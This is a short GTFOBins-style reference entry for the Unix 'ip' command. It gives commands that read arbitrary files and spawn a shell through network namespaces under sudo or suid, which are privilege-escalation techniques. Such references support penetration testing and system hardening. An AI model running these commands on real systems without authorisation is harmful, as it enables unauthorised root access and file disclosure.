---
type: gtfobin
name: ip
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# ip

## file-read

```bash
ip -force -batch /path/to/input-file
```
_The read file content is corrupted by error prints._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo
```
**Contexts:** sudo, suid

```bash
ip netns add foo
ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
ip netns exec bar /bin/sh
ip netns delete foo
ip netns delete bar
```
**Contexts:** sudo
